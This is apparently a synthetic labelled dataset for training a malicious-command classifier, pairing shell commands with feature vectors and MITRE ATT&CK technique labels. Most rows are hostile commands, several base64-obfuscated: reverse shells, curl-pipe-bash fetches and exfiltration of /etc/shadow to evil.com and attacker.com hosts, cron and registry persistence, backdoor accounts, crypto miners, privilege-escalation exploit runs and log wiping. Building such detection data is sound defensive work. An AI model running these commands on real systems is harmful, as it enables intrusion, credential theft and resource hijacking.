time echo 'bmJ0c2NhbiAxOTIuMTY4LjEuMC8yNA==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1018_Remote_System_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
ip neigh show | history -c,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.2, 0.24, 1, 0]","['T1016_System_Network_Config_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
New-ItemProperty  -Path  'HKLM:\...'  -Name  Persist  -Value  'C:\payload.exe',"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1112_Modify_Registry'],synthetic
echo 'Z3JlcCAtciAncGFzc3dvcmQnIC92YXIvd3d3L2h0bWwgLS1pbmNsdWRlPScqLnBocCc=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1003_OS_Credential_Dumping', 'T1027_Obfuscated_Files_or_Information']",synthetic
su - admin,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1078_Valid_Accounts'],synthetic
"bash -c ""ncrack -p 22 --user root -P pass.lst 10.0.0.1""","[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.4, 0, 0]",['T1110_Brute_Force'],synthetic
ping -c 4 8.8.8.8,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['BENIGN'],synthetic
curl -A 'Mozilla/5.0' http://c2.attacker.com/check-in,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1071_Application_Layer_Protocol'],synthetic
nohup grep -r 'password' /var/www/html --include='*.php' ; echo done &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.4, 1, 0]","['T1003_OS_Credential_Dumping', 'T1059_Command_and_Scripting_Interpreter']",synthetic
time echo 'c3UgLSBhZG1pbg==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1078_Valid_Accounts', 'T1027_Obfuscated_Files_or_Information']",synthetic
getent group sudo | echo done,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.24, 1, 0]","['T1069_Permission_Groups_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
lsb_release -a,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1082_System_Information_Discovery'],synthetic
tftp -i 10.0.0.99 GET payload.exe C:\Windows\Temp\payload.exe,"[1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1105_Ingress_Tool_Transfer'],synthetic
find / -writable -type d 2>/dev/null,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.24, 0, 0]",['T1083_File_and_Directory_Discovery'],synthetic
getent  passwd  |  grep  -v  nologin,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.24, 1, 0]",['T1087_Account_Discovery'],synthetic
echo '@reboot /tmp/backdoor.sh' | crontab -,"[0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.24, 1, 0]",['T1053_Scheduled_Task'],synthetic
nmap --script=vuln 10.0.0.1,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.12, 0, 0]",['T1046_Network_Service_Scanning'],synthetic
getent passwd | grep -v nologin,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.24, 1, 0]",['T1087_Account_Discovery'],synthetic
New-ItemProperty -Path 'HKLM:\...' -Name Persist -Value 'C:\payload.exe' ; > /dev/null 2>&1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.44, 1, 0]","['T1112_Modify_Registry', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo 'YXJwIC1hIHwgPiAvZGV2L251bGwgMj4mMQ==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1016_System_Network_Config_Discovery', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
curl -s http://c2.attacker.com/beacon,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1041_Exfiltration_Over_C2_Channel'],synthetic
./dirtycow /etc/passwd 'root::0:0:root:/root:/bin/bash' ; sleep 1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 1, 1]","['T1068_Exploitation_for_Privilege_Escalation', 'T1059_Command_and_Scripting_Interpreter']",synthetic
nohup echo 'bmV0IHVzZXIgL2FkZCBhdHRhY2tlciBQQHNzdzByZA==' | base64 -d | bash &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1136_Create_Account', 'T1027_Obfuscated_Files_or_Information']",synthetic
(crontab -l; echo '* * * * * /tmp/payload.sh') | crontab -,"[0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.48, 1, 0]",['T1053_Scheduled_Task'],synthetic
"bash -c ""route -n""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1016_System_Network_Config_Discovery'],synthetic
"bash -c ""net user /add attacker P@ssw0rd && echo done""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.4, 1, 0]","['T1136_Create_Account', 'T1059_Command_and_Scripting_Interpreter']",synthetic
sed -i 's/old/new/g' config.cfg,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['BENIGN'],synthetic
certutil.exe -urlcache -split -f http://attacker.com/nc.exe nc.exe | sleep 1,"[0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0.2, 0.36, 1, 0]","['T1105_Ingress_Tool_Transfer', 'T1059_Command_and_Scripting_Interpreter']",synthetic
sudo net user /add attacker P@ssw0rd,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1136_Create_Account'],synthetic
id -u,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.08, 0, 0]",['T1033_System_Owner_Discovery'],synthetic
"bash -c ""cat ~/.ssh/id_rsa && history -c""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.28, 1, 0]","['T1003_OS_Credential_Dumping', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo 'c3NoIGFkbWluQGxvY2FsaG9zdCA7IGhpc3RvcnkgLWM=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1078_Valid_Accounts', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
ping  -c  4  8.8.8.8,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['BENIGN'],synthetic
nohup tar -czf backup.tar.gz /home/user &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0.0, 0.24, 0, 0]",['BENIGN'],synthetic
"bash -c ""echo 'Li9DVkUtMjAyMS00MDM0IDsgc2xlZXAgMQ==' | base64 -d | bash""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1068_Exploitation_for_Privilege_Escalation', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
time nohup ./xmrig --url stratum+tcp://pool.minexmr.com:443 --user wallet & && sleep 1,"[0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.44, 1, 0]","['T1496_Resource_Hijacking', 'T1059_Command_and_Scripting_Interpreter']",synthetic
pip install requests,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['BENIGN'],synthetic
./CVE-2021-4034,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.04, 0, 1]",['T1068_Exploitation_for_Privilege_Escalation'],synthetic
reg delete HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Defender,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1112_Modify_Registry'],synthetic
"bash -c ""./CVE-2021-4034""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1068_Exploitation_for_Privilege_Escalation'],synthetic
time find /var/log -name '*.log' -exec truncate -s 0 {} \;,"[0, 0, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.44, 0, 0]",['T1070_Indicator_Removal'],synthetic
sh -c 'curl http://evil.com/shell.sh | bash',"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.24, 1, 0]",['T1059_Command_and_Scripting_Interpreter'],synthetic
at now + 1 minute <<< '/tmp/payload',"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1053_Scheduled_Task'],synthetic
time ./pwnkit,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1068_Exploitation_for_Privilege_Escalation'],synthetic
pip  install  requests,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['BENIGN'],synthetic
echo 'c3VkbyAtdSB3d3ctZGF0YSBiYXNoIDsgZWNobyBkb25l' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1078_Valid_Accounts', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
sudo nohup ./xmrig --url stratum+tcp://pool.minexmr.com:443 --user wallet &,"[0, 0, 0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 0, 0]",['T1496_Resource_Hijacking'],synthetic
echo 'c2ggLWMgJ2N1cmwgaHR0cDovL2V2aWwuY29tL3NoZWxsLnNoIHwgYmFzaCc=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /d C:\payload.exe,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1112_Modify_Registry'],synthetic
echo 'c2NwIGF0dGFja2VyQDEwLjAuMC45OTovdG9vbHMvbGlucGVhcy5zaCAvdG1wLyB8IHNsZWVwIDE=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1105_Ingress_Tool_Transfer', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
wget  -q  -O-  --header='X-Auth:  token123'  http://evil.com/cmd,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1071_Application_Layer_Protocol'],synthetic
time dmidecode -t system,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1082_System_Information_Discovery'],synthetic
cat /tmp/encoded | xxd -r -p | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.4, 0.32, 1, 0]",['T1027_Obfuscated_Files_or_Information'],synthetic
adduser --shell /bin/bash --disabled-password backdoor,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1136_Create_Account'],synthetic
"bash -c ""route -n && echo done""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 1, 0]","['T1016_System_Network_Config_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
nmap -sV --version-intensity 5 -p 1-65535 10.0.0.1,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.28, 0, 0]",['T1046_Network_Service_Scanning'],synthetic
usermod -aG sudo compromised_user,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1098_Account_Manipulation'],synthetic
echo 'c3UgLXMgL2Jpbi9iYXNoIHd3dy1kYXRhIHwgPiAvZGV2L251bGwgMj4mMQ==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1078_Valid_Accounts', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
cat /etc/shadow | nc 10.0.0.99 4444,"[1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.24, 1, 0]",['T1041_Exfiltration_Over_C2_Channel'],synthetic
getent passwd | grep -v nologin,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.24, 1, 0]",['T1087_Account_Discovery'],synthetic
time journalctl -u ssh --since today,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['BENIGN'],synthetic
time arp-scan --localnet,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.12, 0, 0]",['T1018_Remote_System_Discovery'],synthetic
wget http://attacker.com/payload -O /tmp/payload,"[0, 1, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1105_Ingress_Tool_Transfer'],synthetic
nohup locate wp-config.php ; chmod +x /tmp/payload &,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 1, 1]","['T1083_File_and_Directory_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
bash -i >& /dev/tcp/10.0.0.99/4444 0>&1,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1059_Command_and_Scripting_Interpreter'],synthetic
echo 'cmVnIGRlbGV0ZSBIS0xNXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFJ1biAvdiBEZWZlbmRlciB8IGVjaG8gZG9uZQ==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1112_Modify_Registry', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo 'Y2F0IC9ldGMvb3MtcmVsZWFzZSA7IHNsZWVwIDE=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1082_System_Information_Discovery', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo 'ZmluZCAvaG9tZSAtbmFtZSAnLmVudicgMj4vZGV2L251bGwgfCBoaXN0b3J5IC1j' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1083_File_and_Directory_Discovery', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
wget --post-file=/etc/passwd http://attacker.com/receive,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1041_Exfiltration_Over_C2_Channel'],synthetic
for  p  in  $(cat  passwords.txt);  do  sshpass  -p  $p  ssh  root@10.0.0.1  id;  done,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.52, 0, 0]",['T1110_Brute_Force'],synthetic
time echo 'dXNlcmFkZCAtbSAtcyAvYmluL2Jhc2ggaGFja2Vy' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1136_Create_Account', 'T1027_Obfuscated_Files_or_Information']",synthetic
sudo dmesg | head -20,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.2, 1, 0]",['T1082_System_Information_Discovery'],synthetic
nohup ./xmrig --url stratum+tcp://pool.minexmr.com:443 --user wallet &,"[0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1496_Resource_Hijacking'],synthetic
time getent passwd | awk -F: '$3 >= 1000',"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.36, 1, 0]",['T1033_System_Owner_Discovery'],synthetic
bash -i >& /dev/tcp/10.0.0.99/4444 0>&1,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1059_Command_and_Scripting_Interpreter'],synthetic
time df -h,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['BENIGN'],synthetic
nohup scp file.txt user@host:/tmp/ &,"[0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['BENIGN'],synthetic
"bash -c ""echo 'ZmluZCAvIC1wZXJtIC00MDAwIC10eXBlIGYgMj4vZGV2L251bGw=' | base64 -d | bash""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1083_File_and_Directory_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo 'JGVudjpjbWQgPSBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVbmljb2RlLkdldFN0cmluZyhbU3lzdGVtLkNvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKCdkd0JvQUc4QVlRQnRBR2tBJykp' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]",['T1027_Obfuscated_Files_or_Information'],synthetic
cat ~/.aws/credentials ; > /dev/null 2>&1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.24, 1, 0]","['T1003_OS_Credential_Dumping', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo 'aXAgbGluayBzaG93' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1016_System_Network_Config_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
nohup id -u &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.16, 0, 0]",['T1033_System_Owner_Discovery'],synthetic
"bash -c ""echo '@reboot /tmp/.xmr/xmrig -o pool.minexmr.com' | crontab -""","[0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.4, 1, 0]",['T1496_Resource_Hijacking'],synthetic
getent passwd | grep -v nologin,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.24, 1, 0]",['T1087_Account_Discovery'],synthetic
echo 'aGlzdG9yeSAtYyAmJiBoaXN0b3J5IC13' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1070_Indicator_Removal', 'T1027_Obfuscated_Files_or_Information']",synthetic
time useradd -m -s /bin/bash -G sudo newadmin,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 0, 0]",['T1098_Account_Manipulation'],synthetic
"bash -c ""echo '@reboot /tmp/.xmr/xmrig -o pool.minexmr.com' | crontab -""","[0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.4, 1, 0]",['T1496_Resource_Hijacking'],synthetic
time adduser --shell /bin/bash --disabled-password backdoor,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1136_Create_Account'],synthetic
net  user  /domain,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1087_Account_Discovery'],synthetic
cat /etc/os-release ; chmod +x /tmp/payload,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 1, 1]","['T1082_System_Information_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
nmap --script=vuln 10.0.0.1,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.12, 0, 0]",['T1046_Network_Service_Scanning'],synthetic
for p in $(cat passwords.txt); do sshpass -p $p ssh root@10.0.0.1 id; done,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.52, 0, 0]",['T1110_Brute_Force'],synthetic
time groups ; > /dev/null 2>&1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.24, 1, 0]","['T1033_System_Owner_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo  'cmVnIGRlbGV0ZSBIS0xNXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFJ1biAvdiBEZWZlbmRlcg=='  |  base64  -d  |  bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1112_Modify_Registry', 'T1027_Obfuscated_Files_or_Information']",synthetic
"bash -c ""gcc exploit.c -o exploit && ./exploit""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 1, 0]",['T1068_Exploitation_for_Privilege_Escalation'],synthetic
"bash -c ""wget -q -O- --header='X-Auth: token123' http://evil.com/cmd && history -c""","[0, 1, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.44, 1, 0]","['T1071_Application_Layer_Protocol', 'T1059_Command_and_Scripting_Interpreter']",synthetic
nmcli  connection  show,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1016_System_Network_Config_Discovery'],synthetic
cat  ~/.ssh/id_rsa,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1003_OS_Credential_Dumping'],synthetic
curl -X POST http://evil.com/collect -d @/etc/shadow && > /dev/null 2>&1,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.4, 1, 0]","['T1041_Exfiltration_Over_C2_Channel', 'T1059_Command_and_Scripting_Interpreter']",synthetic
"bash -c ""wget -q http://miner.com/xmrig -O /tmp/xmr && chmod +x /tmp/xmr && /tmp/xmr -o pool.minexmr.com:443""","[0, 1, 1, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.6, 1, 1]",['T1496_Resource_Hijacking'],synthetic
"php -r '$sock=fsockopen(""10.0.0.99"",4444); ...'","[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1059_Command_and_Scripting_Interpreter'],synthetic
echo 'dXNlcmFkZCAtbSAtcyAvYmluL2Jhc2ggaGFja2Vy' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1136_Create_Account', 'T1027_Obfuscated_Files_or_Information']",synthetic
mimikatz.exe 'sekurlsa::logonpasswords' exit,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1003_OS_Credential_Dumping'],synthetic
"bash -c ""echo 'aWQgLUdu' | base64 -d | bash""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1069_Permission_Groups_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
gcc exploit.c -o exploit && ./exploit,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 1, 0]",['T1068_Exploitation_for_Privilege_Escalation'],synthetic
useradd -m -s /bin/bash -G sudo newadmin && > /dev/null 2>&1,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.44, 1, 0]","['T1098_Account_Manipulation', 'T1059_Command_and_Scripting_Interpreter']",synthetic
nmap -A -T4 192.168.1.0/24,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.16, 0, 0]",['T1046_Network_Service_Scanning'],synthetic
echo -e '\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68',"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1027_Obfuscated_Files_or_Information'],synthetic
echo 'aXAgcm91dGUgc2hvdw==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1016_System_Network_Config_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
route -n | history -c,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.2, 0.2, 1, 0]","['T1016_System_Network_Config_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
New-ItemProperty -Path 'HKLM:\...' -Name Persist -Value 'C:\payload.exe' | sleep 1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.4, 1, 0]","['T1112_Modify_Registry', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo 'cGFzc3dkIC1kIHJvb3Q=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1098_Account_Manipulation', 'T1027_Obfuscated_Files_or_Information']",synthetic
getent group sudo,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1069_Permission_Groups_Discovery'],synthetic
echo 'aGVsbG8=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]",['T1027_Obfuscated_Files_or_Information'],synthetic
lsb_release -a,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1082_System_Information_Discovery'],synthetic
time adduser --shell /bin/bash --disabled-password backdoor,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1136_Create_Account'],synthetic
reg delete HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Defender,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1112_Modify_Registry'],synthetic
